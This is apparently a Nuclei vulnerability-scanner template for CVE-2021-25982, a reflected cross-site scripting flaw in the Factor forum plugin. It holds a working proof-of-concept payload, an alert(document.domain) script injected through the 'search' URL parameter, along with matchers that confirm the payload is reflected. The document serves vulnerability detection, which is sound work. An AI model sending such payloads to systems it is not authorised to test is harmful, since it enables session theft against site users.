id: CVE-2021-25982

info:
  name: Factor 1.3.5 to 1.8.30 - Reflected XSS
  author: edoardottt
  severity: medium
  description: |
    In Factor (App Framework & Headless CMS) forum plugin, versions 1.3.5 to 1.8.30, are vulnerable to reflected Cross-Site Scripting (XSS) at the "search" parameter in the URL. An unauthenticated attacker can execute malicious JavaScript code and steal the session cookies.
  reference:
    - https://www.mend.io/vulnerability-database/CVE-2021-25982
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25982
    - https://nvd.nist.gov/vuln/detail/CVE-2021-25982
  classification:
    cve-id: CVE-2021-25982
  tags: cve,cve2021,factor,xss

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?search=%3Cscript%3Ealert(document.domain)%3C/script%3E"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "text/html"

      - type: word
        part: body
        words:
          - "<script>alert(document.domain)</script>"